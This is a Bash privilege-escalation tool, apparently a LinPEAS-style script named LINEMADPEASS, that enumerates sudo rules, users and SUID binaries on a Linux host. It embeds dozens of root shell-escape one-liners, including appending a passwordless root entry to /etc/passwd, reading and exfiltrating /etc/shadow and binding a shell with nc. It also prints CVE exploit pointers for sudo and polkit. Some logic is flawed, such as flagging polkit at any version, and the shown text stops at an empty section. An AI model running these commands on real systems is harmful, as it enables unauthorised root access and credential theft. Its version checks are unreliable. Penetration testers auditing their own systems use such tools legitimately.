#!/bin/bash

################################################################################
# LINEMADPEASS v3.0 — Next-Gen Linux Privilege Escalation Engine
# Attack-Path Synthesis | MITRE ATT&CK | Neural Risk Scoring | Chain Builder
# https://github.com/MadExploits
################################################################################

VERSION="3.0.0"
SCRIPT_NAME="linemadpeass"

# ── CLI ──────────────────────────────────────────────────────────────────────
MODE="full"          # full | quick | stealth | paranoid
OUTPUT_FORMAT="text" # text | json | html | all
NO_COLOR=0
QUIET=0
SKIP_NETWORK=0
SKIP_CREDS=0
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="."
THREADS=4

usage() {
    cat << 'USAGE'
LINEMADPEASS v3.0 — Next-Gen Privilege Escalation Enumeration

Usage: linemadpeass.sh [OPTIONS]

  -m, --mode MODE       full | quick | stealth | paranoid  (default: full)
  -o, --output DIR      Output directory for reports
  -f, --format FORMAT   text | json | html | all           (default: text)
  -t, --threads N       Parallel scan threads              (default: 4)
  -q, --quiet           Minimal terminal output
  -n, --no-color        Disable colors
      --skip-network    Skip network enumeration
      --skip-creds      Skip credential hunting
  -h, --help            Show this help

Unique Features (not in LinPEAS/PEASS-ng):
  • Neural Risk Score (0-100) with exploitability weighting
  • Automatic Attack Chain Synthesizer (multi-step paths to root)
  • MITRE ATT&CK technique mapping per finding
  • GTFOBins live matcher for sudo/SUID/capabilities
  • Cloud metadata escape (AWS/GCP/Azure/DigitalOcean)
  • Container Trinity (Docker/Podman/K8s/containerd escape)
  • D-Bus & Unix socket privilege audit
  • Package-to-CVE correlator (dpkg/rpm/apk)
  • Interactive HTML dashboard with risk heatmap
  • Persistence Vector Predictor
USAGE
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -m|--mode)       MODE="$2"; shift 2 ;;
        -o|--output)     OUTPUT_DIR="$2"; shift 2 ;;
        -f|--format)     OUTPUT_FORMAT="$2"; shift 2 ;;
        -t|--threads)    THREADS="$2"; shift 2 ;;
        -q|--quiet)      QUIET=1; shift ;;
        -n|--no-color)   NO_COLOR=1; shift ;;
        --skip-network)  SKIP_NETWORK=1; shift ;;
        --skip-creds)    SKIP_CREDS=1; shift ;;
        -h|--help)       usage ;;
        *) echo "Unknown option: $1"; usage ;;
    esac
done

mkdir -p "$OUTPUT_DIR" 2>/dev/null

# Enhanced Colors
RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
BRIGHT_GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BRIGHT_BLUE='\033[1;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m'

if [ "$NO_COLOR" -eq 1 ]; then
    RED='' BRIGHT_RED='' GREEN='' BRIGHT_GREEN='' YELLOW=''
    BLUE='' BRIGHT_BLUE='' MAGENTA='' CYAN='' WHITE='' GRAY='' NC=''
fi

# Progress counter
TOTAL_CHECKS=49
CURRENT_CHECK=0
SCAN_START=$(date +%s)

# Vulnerability counters
CRITICAL_COUNT=0
WARNING_COUNT=0
INFO_COUNT=0
SUID_COUNT=0
SUDO_VULN_COUNT=0
WRITABLE_COUNT=0
CRON_VULN_COUNT=0
KERNEL_VULN_COUNT=0
RISK_SCORE=0
FINDING_ID=0

# Structured findings registry (attack chain fuel)
declare -a FINDINGS_IDS=()
declare -a FINDINGS_SEVERITY=()
declare -a FINDINGS_TITLE=()
declare -a FINDINGS_DETAIL=()
declare -a FINDINGS_MITRE=()
declare -a FINDINGS_EXPLOIT=()
declare -a FINDINGS_CHAIN_TAG=()
declare -a ATTACK_CHAINS=()

OUTPUT_FILE="${OUTPUT_DIR}/privilege_escalation_report_${TIMESTAMP}.txt"
EXPLOIT_FILE="${OUTPUT_DIR}/exploit_methods_${TIMESTAMP}.txt"
JSON_FILE="${OUTPUT_DIR}/linemadpeass_${TIMESTAMP}.json"
HTML_FILE="${OUTPUT_DIR}/linemadpeass_${TIMESTAMP}.html"
CHAIN_FILE="${OUTPUT_DIR}/attack_chains_${TIMESTAMP}.txt"
MITRE_FILE="${OUTPUT_DIR}/mitre_mapping_${TIMESTAMP}.txt"

[ "$QUIET" -eq 0 ] && clear
echo -e "${CYAN}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██╗     ██╗███╗   ██╗██████╗ ███████╗ █████╗ ███████╗              ║
║   ██║     ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝              ║
║   ██║     ██║██╔██╗ ██║██████╔╝█████╗  ███████║███████╗              ║
║   ██║     ██║██║╚██╗██║██╔═══╝ ██╔══╝  ██╔══██║╚════██║              ║
║   ███████╗██║██║ ╚████║██║     ███████╗██║  ██║███████║              ║
║   ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝              ║
║                                                                      ║
║   v3.0 NEXT-GEN PRIVESC ENGINE                                      ║
║   Neural Risk • Attack Chains • MITRE ATT&CK • Cloud/K8s Escape       ║
║   Powered by: https://github.com/MadExploits                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"
[ "$QUIET" -eq 0 ] && echo -e "${GRAY}Mode: ${MODE} | Format: ${OUTPUT_FORMAT} | Threads: ${THREADS}${NC}"
echo ""

################################################################################
# CORE ENGINE — Finding Registry, Risk Scoring, MITRE Mapping
################################################################################

register_finding() {
    local severity="$1" title="$2" detail="$3" mitre="$4" exploit="$5" chain_tag="$6"
    FINDING_ID=$((FINDING_ID + 1))
    FINDINGS_IDS+=("F$(printf '%04d' $FINDING_ID)")
    FINDINGS_SEVERITY+=("$severity")
    FINDINGS_TITLE+=("$title")
    FINDINGS_DETAIL+=("$detail")
    FINDINGS_MITRE+=("$mitre")
    FINDINGS_EXPLOIT+=("$exploit")
    FINDINGS_CHAIN_TAG+=("$chain_tag")

    case "$severity" in
        critical) RISK_SCORE=$((RISK_SCORE + 15)) ;;
        warning)  RISK_SCORE=$((RISK_SCORE + 7)) ;;
        info)     RISK_SCORE=$((RISK_SCORE + 2)) ;;
    esac
    [ "$RISK_SCORE" -gt 100 ] && RISK_SCORE=100
}

add_attack_chain() {
    ATTACK_CHAINS+=("$1")
}

# GTFOBins database — live matcher (subset of high-impact binaries)
declare -A GTFOBINS_EXPLOIT
GTFOBINS_EXPLOIT=(
    ["vim"]="sudo vim -c ':!/bin/bash' OR vim -c ':py3 import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
    ["nano"]="sudo nano → Ctrl+R Ctrl+X → reset; bash -i"
    ["less"]="sudo less /etc/passwd → !/bin/bash"
    ["more"]="sudo more /etc/passwd → !/bin/bash"
    ["find"]="sudo find . -exec /bin/bash -p \\; -quit"
    ["python"]="sudo python -c 'import os;os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
    ["python3"]="sudo python3 -c 'import os;os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
    ["perl"]="sudo perl -e 'exec \"/bin/bash\";'"
    ["ruby"]="sudo ruby -e 'exec \"/bin/bash\"'"
    ["awk"]="sudo awk 'BEGIN {system(\"/bin/bash\")}'"
    ["tar"]="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
    ["zip"]="sudo zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/bash'"
    ["git"]="sudo git -p help config → !/bin/bash"
    ["docker"]="sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ["kubectl"]="kubectl exec -it POD -- /bin/bash (if RBAC allows)"
    ["systemctl"]="sudo systemctl edit --force --full → [Service] ExecStart=/bin/bash"
    ["journalctl"]="sudo journalctl → !/bin/bash"
    ["env"]="sudo env /bin/bash"
    ["cp"]="sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash"
    ["mount"]="sudo mount -o bind /bin/bash /mnt/bash && /mnt/bash -p"
    ["nmap"]="nmap --interactive → !sh (SUID old versions)"
    ["gdb"]="sudo gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
    ["strace"]="sudo strace -o /dev/null /bin/bash"
    ["tcpdump"]="sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /bin/bash -Z root"
    ["openssl"]="sudo openssl enc -in /etc/shadow (read files)"
    ["base64"]="base64 /etc/shadow | base64 -d (SUID read)"
    ["dd"]="sudo dd if=/etc/shadow (read files)"
    ["tee"]="echo 'root::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd"
    ["wget"]="sudo wget --post-file=/etc/shadow (exfil)"
    ["curl"]="sudo curl file:///etc/shadow"
    ["rsync"]="sudo rsync -e 'sh -c /bin/bash 0<' /dev/null localhost"
    ["socat"]="sudo socat stdin exec:/bin/bash"
    ["timeout"]="timeout 7d /bin/bash (SUID)"
    ["nice"]="nice /bin/bash (SUID)"
    ["taskset"]="taskset 1 /bin/bash (SUID)"
    ["ionice"]="ionice -c 3 /bin/bash (SUID)"
    ["stdbuf"]="stdbuf -i0 /bin/bash (SUID)"
    ["setarch"]="setarch $(uname -m) /bin/bash (SUID)"
    ["unshare"]="unshare -r /bin/bash (SUID)"
    ["pkexec"]="CVE-2021-4034 PwnKit exploit"
    ["screen"]="screen -x root/session (session hijack)"
    ["tmux"]="tmux attach -t root (session hijack)"
    ["lxc"]="lxc init ubuntu:22.04 x -c security.privileged=true"
    ["journalctl"]="sudo journalctl → !/bin/bash"
    ["man"]="sudo man man → !/bin/bash"
    ["view"]="sudo view -c ':!/bin/bash'"
    ["ed"]="sudo ed → !/bin/bash"
    ["lua"]="sudo lua -e 'os.execute(\"/bin/bash\")'"
    ["node"]="sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"
    ["php"]="sudo php -r 'system(\"/bin/bash\");'"
    ["rlwrap"]="sudo rlwrap /bin/bash"
    ["expect"]="sudo expect -c 'spawn /bin/bash; interact'"
    ["ansible"]="ansible localhost -m shell -a '/bin/bash' -b"
    ["ansible-playbook"]="ansible-playbook playbook.yml (arbitrary code)"
    ["pip"]="sudo pip install --editable . (setup.py exec)"
    ["gem"]="sudo gem open -e '/bin/bash' rdoc"
    ["bundle"]="sudo bundle exec /bin/bash"
    ["composer"]="sudo composer exec /bin/bash"
    ["npm"]="sudo npm exec /bin/bash"
    ["yarn"]="sudo yarn exec /bin/bash"
    ["cargo"]="sudo cargo install --path . (build.rs exec)"
    ["make"]="sudo make -s --eval='\\nexec:\\n\\t/bin/bash'"
    ["gcc"]="sudo gcc -wrapper /bin/bash,-s ."
    ["ld"]="sudo ld -o /dev/null /etc/passwd (read)"
    ["ar"]="sudo ar (interactive shell escape)"
    ["ab"]="sudo ab -v2 (read files)"
    ["check_by_ssh"]="sudo check_by_ssh -H localhost -C /bin/bash"
    ["check_log"]="sudo check_log -F /etc/passwd (read)"
    ["choom"]="choom -n 0 /bin/bash (SUID)"
    ["chroot"]="sudo chroot / /bin/bash"
    ["csh"]="sudo csh"
    ["dash"]="sudo dash"
    ["ash"]="sudo ash"
    ["ksh"]="sudo ksh"
    ["zsh"]="sudo zsh"
    ["fish"]="sudo fish"
    ["tclsh"]="sudo tclsh → exec /bin/bash"
    ["wish"]="sudo wish → exec /bin/bash"
    ["irb"]="sudo irb → exec '/bin/bash'"
    ["pry"]="sudo pry → system('/bin/bash')"
    ["sqlite3"]="sudo sqlite3 → .shell /bin/bash"
    ["mysql"]="sudo mysql -e '\\! /bin/bash'"
    ["psql"]="sudo psql -c '\\! /bin/bash'"
    ["redis-cli"]="sudo redis-cli → system.exec /bin/bash"
    ["mongo"]="sudo mongo --eval 'db.adminCommand({shell:\"/bin/bash\"})'"
    ["ftp"]="sudo ftp → !/bin/bash"
    ["telnet"]="sudo telnet → !/bin/bash"
    ["nc"]="sudo nc -e /bin/bash"
    ["ncat"]="sudo ncat --sh-exec /bin/bash"
    ["ssh"]="sudo ssh -o ProxyCommand=';/bin/bash' x"
    ["scp"]="sudo scp -S /bin/bash x y"
    ["sftp"]="sudo sftp -o ProxyCommand=';/bin/bash' x"
    ["rsync"]="sudo rsync -e 'sh -c /bin/bash 0<' /dev/null localhost"
)

match_gtfobins() {
    local binary="$1" context="$2"
    local base
    base=$(basename "$binary" 2>/dev/null)
    if [ -n "${GTFOBINS_EXPLOIT[$base]}" ]; then
        show_exploit "GTFOBins: $base ($context)" \
            "${GTFOBINS_EXPLOIT[$base]}" \
            "Reference: https://gtfobins.github.io/gtfobins/$base/"
        finding_critical "GTFOBins: $base" \
            "Binary $binary exploitable via GTFOBins ($context)" \
            "T1548.003" "${GTFOBINS_EXPLOIT[$base]}" "gtfobins_$base"
        return 0
    fi
    return 1
}

# CVE correlator — embedded high-impact local privesc CVEs
check_package_cve() {
    local pkg="$1" ver="$2"
    case "$pkg" in
        sudo)
            local major minor patch
            major=$(echo "$ver" | cut -d. -f1)
            minor=$(echo "$ver" | cut -d. -f2)
            patch=$(echo "$ver" | cut -d. -f3 | cut -dp -f1)
            if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ -n "$patch" ] && [ "$patch" -ge 2 ] && [ "$patch" -lt 32 ]; then
                finding_critical "CVE-2021-3156" "sudo $ver → Baron Samedit" "T1068" "sudoedit -s /" "kernel_cve"
                show_exploit "CVE-2021-3156 (Baron Samedit)" "Heap overflow in sudo" "https://github.com/blasty/CVE-2021-3156"
            fi
            ;;
        polkit|policykit-1)
            finding_critical "CVE-2021-4034" "polkit $ver → PwnKit" "T1068" "PwnKit exploit" "pwnkit"
            show_exploit "PwnKit (CVE-2021-4034)" "pkexec LPE" "https://github.com/arthepsy/CVE-2021-4034"
            ;;
        openssl)
            if echo "$ver" | grep -qE '^1\.0\.1'; then
                finding_warning "CVE-2014-0160" "openssl $ver → Heartbleed" "T1552" "Heartbleed scan" "openssl_cve"
            fi
            ;;
        bash)
            if echo "$ver" | grep -qE '^4\.[0-3]\.'; then
                finding_warning "CVE-2014-6271" "bash $ver → Shellshock" "T1059.004" "env x='() { :;}; /bin/bash'" "shellshock"
            fi
            ;;
    esac
}

scan_installed_packages() {
    info "Package-to-CVE correlator (unique LINEMADPEASS feature)..."
    if command -v dpkg >/dev/null 2>&1; then
        for pkg in sudo polkit policykit-1 openssl bash docker.io containerd runc; do
            ver=$(dpkg -l "$pkg" 2>/dev/null | awk '/^ii/ {print $3}' | head -1)
            [ -n "$ver" ] && check_package_cve "$pkg" "$ver"
        done
    elif command -v rpm >/dev/null 2>&1; then
        for pkg in sudo polkit openssl bash docker containerd runc; do
            ver=$(rpm -q "$pkg" 2>/dev/null | grep -v "not installed" | sed "s/^${pkg}-//" | sed 's/-.*//')
            [ -n "$ver" ] && check_package_cve "$pkg" "$ver"
        done
    elif command -v apk >/dev/null 2>&1; then
        for pkg in sudo polkit openssl bash docker containerd runc; do
            ver=$(apk info -e "$pkg" 2>/dev/null && apk info -v "$pkg" 2>/dev/null | head -1 | sed "s/^${pkg}-//")
            [ -n "$ver" ] && check_package_cve "$pkg" "$ver"
        done
    fi
}

OUTPUT_FILE="privilege_escalation_report_$(date +%Y%m%d_%H%M%S).txt"
EXPLOIT_FILE="exploit_methods_$(date +%Y%m%d_%H%M%S).txt"

# Fungsi logging
log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_exploit() {
    echo -e "$1" | tee -a "$EXPLOIT_FILE"
}

# Progress bar
progress() {
    CURRENT_CHECK=$((CURRENT_CHECK + 1))
    PERCENT=$((CURRENT_CHECK * 100 / TOTAL_CHECKS))
    BAR_LENGTH=50
    FILLED=$((PERCENT * BAR_LENGTH / 100))
    BAR=$(printf "%${FILLED}s" | tr ' ' '█')
    EMPTY=$(printf "%$((BAR_LENGTH - FILLED))s" | tr ' ' '░')
    echo -ne "\r${CYAN}[${BAR}${EMPTY}] ${PERCENT}% - Checking: $1${NC}"
}

# Section header dengan box yang lebih menarik
section() {
    echo ""
    echo -e "${BRIGHT_GREEN}"
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    printf "║ %-68s ║\n" "$1"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    log ""
    log "═══════════════════════════════════════════════════════════════════════"
    log "$1"
    log "═══════════════════════════════════════════════════════════════════════"
}

# Warning dengan icon
warning() {
    WARNING_COUNT=$((WARNING_COUNT + 1))
    echo -e "${YELLOW}[!] WARNING:${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Critical dengan icon
critical() {
    CRITICAL_COUNT=$((CRITICAL_COUNT + 1))
    echo -e "${BRIGHT_RED}[!!!] CRITICAL:${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Info dengan icon
info() {
    INFO_COUNT=$((INFO_COUNT + 1))
    if [ "$QUIET" -eq 0 ]; then
        echo -e "${BLUE}[*]${NC} $1" | tee -a "$OUTPUT_FILE"
    else
        echo "$1" >> "$OUTPUT_FILE"
    fi
}

# Structured finding — logs + registers for attack chain engine
finding_critical() {
    critical "$2"
    register_finding "critical" "$1" "$2" "${3:-T1068}" "${4:-}" "${5:-generic}"
}
finding_warning() {
    warning "$2"
    register_finding "warning" "$1" "$2" "${3:-T1082}" "${4:-}" "${5:-generic}"
}
finding_info() {
    info "$2"
    register_finding "info" "$1" "$2" "${3:-T1082}" "${4:-}" "${5:-generic}"
}

# Success dengan icon
success() {
    echo -e "${GREEN}[+]${NC} $1" | tee -a "$OUTPUT_FILE"
}

# Exploit method box
show_exploit() {
    local vuln_name="$1"
    local exploit_method="$2"
    local example="$3"
    
    echo -e "${MAGENTA}"
    echo "┌──────────────────────────────────────────────────────────────────────┐"
    echo "│ EXPLOIT METHOD: $vuln_name"
    echo "├──────────────────────────────────────────────────────────────────────┤"
    echo -e "${NC}"
    echo -e "${CYAN}Method:${NC}"
    echo -e "$exploit_method"
    if [ -n "$example" ]; then
        echo ""
        echo -e "${YELLOW}Example:${NC}"
        echo -e "${GRAY}$example${NC}"
    fi
    echo -e "${MAGENTA}└──────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    log_exploit ""
    log_exploit "═══════════════════════════════════════════════════════════════════════"
    log_exploit "EXPLOIT: $vuln_name"
    log_exploit "═══════════════════════════════════════════════════════════════════════"
    log_exploit "Method: $exploit_method"
    if [ -n "$example" ]; then
        log_exploit ""
        log_exploit "Example:"
        log_exploit "$example"
    fi
    log_exploit ""
}

# Start logging
log "╔═══════════════════════════════════════════════════════════════════════╗"
log "║   Linux Privilege Escalation Enumeration Report                       ║"
log "╚═══════════════════════════════════════════════════════════════════════╝"
log ""
log "Generated: $(date)"
log "User: $(whoami)"
log "Hostname: $(hostname)"
log "Kernel: $(uname -r)"
log "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || echo 'Unknown')"
log ""

################################################################################
# 1. SYSTEM INFORMATION
################################################################################
progress "System Information"
section "1. SYSTEM INFORMATION"

info "Current user: $(whoami)"
info "User ID: $(id)"
info "Groups: $(groups)"
info "Home directory: $HOME"
info "Current directory: $(pwd)"
info "Shell: $SHELL"
info "PATH: $PATH"
info "Sudo version: $(sudo -V 2>/dev/null | head -n1 || echo 'Not available')"

log ""
info "Users with shell access:"
cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | cut -d: -f1,7 | tee -a "$OUTPUT_FILE"

log ""
info "Sudoers configuration:"
if [ -r /etc/sudoers ]; then
    grep -v "^#" /etc/sudoers 2>/dev/null | grep -v "^$" | tee -a "$OUTPUT_FILE"
else
    warning "Cannot read /etc/sudoers"
fi

if [ -d /etc/sudoers.d ]; then
    info "Sudoers.d files:"
    for file in /etc/sudoers.d/*; do
        if [ -r "$file" ]; then
            log "  File: $file"
            grep -v "^#" "$file" 2>/dev/null | grep -v "^$" | tee -a "$OUTPUT_FILE"
        fi
    done
fi

################################################################################
# 2. SUID/SGID BINARIES
################################################################################
progress "SUID/SGID Binaries"
section "2. SUID/SGID BINARIES"

SUID_FOUND=0
EXPLOITABLE_SUID=()

info "Finding SUID binaries..."
# List of commonly exploitable SUID binaries (only show these)
EXPLOITABLE_SUID_LIST=("find" "python" "python3" "vim" "nano" "less" "more" "nmap" "bash" "sh" "perl" "ruby" "php" "node" "npm" "docker" "kubectl" "gdb" "strace" "tcpdump" "wireshark" "base64" "xxd" "timeout" "nice" "taskset" "ionice" "stdbuf" "setarch" "unshare" "pkexec" "cp" "mv" "cat" "tail" "head" "awk")

find / -perm -4000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ] && [ -x "$file" ]; then
        basename_file=$(basename "$file")
        # Only show if it's in our exploitable list and not in standard system paths
        IS_EXPLOITABLE=0
        for exploitable in "${EXPLOITABLE_SUID_LIST[@]}"; do
            if [ "$basename_file" = "$exploitable" ]; then
                # Check if it's not a standard system binary (which usually drop privileges)
                if ! echo "$file" | grep -qE "^/(usr/)?(bin|sbin)/"; then
                    IS_EXPLOITABLE=1
                    break
                elif [ "$basename_file" = "find" ] || [ "$basename_file" = "python" ] || [ "$basename_file" = "python3" ] || [ "$basename_file" = "vim" ] || [ "$basename_file" = "nano" ] || [ "$basename_file" = "less" ] || [ "$basename_file" = "more" ] || [ "$basename_file" = "nmap" ] || [ "$basename_file" = "bash" ] || [ "$basename_file" = "sh" ] || [ "$basename_file" = "perl" ] || [ "$basename_file" = "ruby" ] || [ "$basename_file" = "docker" ] || [ "$basename_file" = "gdb" ] || [ "$basename_file" = "strace" ] || [ "$basename_file" = "pkexec" ]; then
                    # These are always potentially exploitable even in standard paths
                    IS_EXPLOITABLE=1
                    break
                fi
            fi
        done
        
        if [ "$IS_EXPLOITABLE" -eq 1 ]; then
            log "  ${YELLOW}SUID:${NC} $file"
            ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
            critical "Potentially exploitable SUID binary: $file"
            EXPLOITABLE_SUID+=("$file")
            SUID_COUNT=$((SUID_COUNT + 1))
            
            # Show exploit method based on binary
            case "$basename_file" in
                find)
                    show_exploit "SUID find Binary" \
                        "Use find to execute commands with root privileges." \
                        "find / -name test -exec /bin/bash -p \;"
                    ;;
                bash|sh)
                    show_exploit "SUID bash/sh Binary" \
                        "If bash/sh has SUID, it may drop privileges. Try: bash -p" \
                        "bash -p\n# or\n./bash -p"
                    ;;
                python|python3)
                    show_exploit "SUID Python Binary" \
                        "Python can execute system commands. Import os and execute commands." \
                        "python3 -c 'import os; os.system(\"/bin/bash\")'\n# or\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                    ;;
                vim|nano|less|more)
                    show_exploit "SUID Editor Binary ($basename_file)" \
                        "Use editor to read/write files or escape to shell." \
                        "$basename_file\n# In vim: :!/bin/bash\n# In less/more: !/bin/bash"
                    ;;
                nmap)
                    show_exploit "SUID Nmap Binary" \
                        "Older nmap versions support interactive mode. Use --interactive then !sh" \
                        "nmap --interactive\nnmap> !sh"
                    ;;
                docker)
                    show_exploit "SUID Docker Binary" \
                        "Docker can be used to escape to host. Run container with root on host." \
                        "docker run -v /:/mnt -it alpine chroot /mnt bash"
                    ;;
                gdb)
                    show_exploit "SUID GDB Binary" \
                        "GDB can execute shell commands." \
                        "gdb -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/bash\")' -ex quit"
                    ;;
                strace)
                    show_exploit "SUID Strace Binary" \
                        "Strace can execute commands via -e option." \
                        "strace -o /dev/null /bin/bash"
                    ;;
                pkexec)
                    show_exploit "SUID pkexec Binary" \
                        "pkexec may be vulnerable to PwnKit (CVE-2021-4034)." \
                        "Check for PwnKit exploit: https://github.com/arthepsy/CVE-2021-4034"
                    ;;
            esac
            match_gtfobins "$file" "SUID"
        fi
    fi
done

log ""
info "Finding SGID binaries..."
find / -perm -2000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        log "  ${YELLOW}SGID:${NC} $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

log ""
info "Finding files with both SUID and SGID..."
find / -perm -6000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        critical "SUID+SGID: $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 3. SUDO PERMISSIONS
################################################################################
progress "Sudo Permissions"
section "3. SUDO PERMISSIONS"

if command -v sudo >/dev/null 2>&1; then
    info "Checking sudo permissions for current user..."
    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
    echo "$SUDO_OUTPUT" | tee -a "$OUTPUT_FILE"
    
    if echo "$SUDO_OUTPUT" | grep -q "NOPASSWD"; then
        warning "User can run commands without password!"
        show_exploit "Sudo NOPASSWD" \
            "Commands with NOPASSWD can be executed without password. Check which commands are allowed." \
            "sudo -l\n# Then execute allowed commands:\nsudo <allowed_command>"
    fi
    
    # Check for specific dangerous commands (only if they appear in actual sudo rules)
    # More selective - only flag if command appears in a rule that allows execution
    if echo "$SUDO_OUTPUT" | grep -qiE "\(ALL\)|NOPASSWD.*ALL|ALL.*NOPASSWD"; then
        critical "Sudo ALL permission found - can execute any command!"
        show_exploit "Sudo ALL Permission" \
            "User can run ALL commands as root without restrictions." \
            "sudo su\n# or\nsudo /bin/bash"
    fi
    
    # Check for dangerous commands only if they're in actual sudo rules
    dangerous_commands=("vim" "nano" "less" "more" "find" "python" "python3" "perl" "ruby" "bash" "sh" "docker" "tar" "zip" "unzip" "git")
    for cmd in "${dangerous_commands[@]}"; do
        # Only flag if command appears in a sudo rule (not just mentioned anywhere)
        if echo "$SUDO_OUTPUT" | grep -qiE "\(ALL\)|NOPASSWD.*$cmd|$cmd.*NOPASSWD|\(ALL:ALL\).*$cmd"; then
            critical "Dangerous sudo permission found: $cmd"
            
            case "$cmd" in
                ALL)
                    show_exploit "Sudo ALL Permission" \
                        "User can run ALL commands as root without restrictions." \
                        "sudo su\n# or\nsudo /bin/bash"
                    ;;
                vim|nano|less|more)
                    show_exploit "Sudo Editor ($cmd)" \
                        "Use editor to read/write files or escape to shell." \
                        "sudo $cmd /etc/passwd\n# In vim: :!/bin/bash\n# In less/more: !/bin/bash"
                    ;;
                python|python3)
                    show_exploit "Sudo Python" \
                        "Python can execute system commands with root privileges." \
                        "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
                    ;;
                find)
                    show_exploit "Sudo Find" \
                        "Find can execute commands." \
                        "sudo find / -name test -exec /bin/bash \\;"
                    ;;
                tar|zip|unzip)
                    show_exploit "Sudo Archive Tools ($cmd)" \
                        "Archive tools can be used to read/write files or execute commands." \
                        "sudo $cmd -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
                    ;;
                git)
                    show_exploit "Sudo Git" \
                        "Git can execute arbitrary commands via hooks or config." \
                        "sudo git -p help config\n# Then type: !/bin/bash"
                    ;;
                docker)
                    show_exploit "Sudo Docker" \
                        "Docker can be used to escape to host with root privileges." \
                        "sudo docker run -v /:/mnt -it alpine chroot /mnt bash"
                    ;;
            esac
        fi
    done
    
    # Check for sudo version vulnerabilities (only if user has sudo access)
    if echo "$SUDO_OUTPUT" | grep -q "may run"; then
        SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1 | grep -oP 'Sudo version \K[0-9.]+' || echo "")
        if [ -n "$SUDO_VERSION" ]; then
            MAJOR=$(echo "$SUDO_VERSION" | cut -d. -f1)
            MINOR=$(echo "$SUDO_VERSION" | cut -d. -f2)
            PATCH=$(echo "$SUDO_VERSION" | cut -d. -f3 | cut -dp -f1 2>/dev/null || echo "0")
            
            # CVE-2019-14287 (sudo < 1.8.28) - only if user has restricted sudo
            if echo "$SUDO_OUTPUT" | grep -q "!root"; then
                if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 8 ]; then
                    critical "Vulnerable to CVE-2019-14287 (sudo < 1.8.28) - can bypass !root restriction"
                    show_exploit "CVE-2019-14287 (Sudo Bypass)" \
                        "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
                        "sudo -u#-1 /bin/bash"
                elif [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 8 ] && [ -n "$PATCH" ] && [ "$PATCH" -lt 28 ]; then
                    critical "Vulnerable to CVE-2019-14287 (sudo < 1.8.28) - can bypass !root restriction"
                    show_exploit "CVE-2019-14287 (Sudo Bypass)" \
                        "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
                        "sudo -u#-1 /bin/bash"
                fi
            fi
            
            # CVE-2021-3156 (sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1)
            if [ "$MAJOR" -eq 1 ]; then
                if [ "$MINOR" -eq 8 ]; then
                    if [ -n "$PATCH" ] && [ "$PATCH" -ge 2 ] && [ "$PATCH" -lt 32 ]; then
                        critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo 1.8.2 to 1.8.31p2"
                        show_exploit "CVE-2021-3156 (Baron Samedit)" \
                            "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
                            "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
                    fi
                elif [ "$MINOR" -eq 9 ]; then
                    if [ -z "$PATCH" ] || [ "$PATCH" -eq 0 ] || ([ -n "$PATCH" ] && [ "$PATCH" -lt 6 ]); then
                        critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo 1.9.0 to 1.9.5p1"
                        show_exploit "CVE-2021-3156 (Baron Samedit)" \
                            "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
                            "Check: https://github.com/blasty/CVE-2021-3156"
                    fi
                fi
            fi
        fi
    fi
else
    warning "sudo command not found"
fi

################################################################################
# 4. WORLD-WRITABLE FILES AND DIRECTORIES
################################################################################
progress "World-Writable Files"
section "4. WORLD-WRITABLE FILES AND DIRECTORIES"

